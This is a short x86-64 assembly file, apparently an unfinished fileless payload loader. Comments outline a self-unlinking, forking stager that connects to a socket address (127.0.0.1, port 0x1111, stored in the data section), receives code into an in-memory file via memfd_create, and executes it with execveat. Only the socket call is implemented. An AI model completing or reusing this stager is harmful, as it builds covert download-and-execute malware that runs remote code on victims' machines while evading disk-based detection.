.intel_syntax noprefix
.global _start
_start:

#unlink
#fork

#socket
#connect
#memfd_create
#recv -> write (loop)

#memfd_create("y", 1);
#execveat ("", NULL, NULL, 0x1000)

mov rax, 41
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall














addr:

.quad 0x0100007f11110002


f:

.asciz "y"
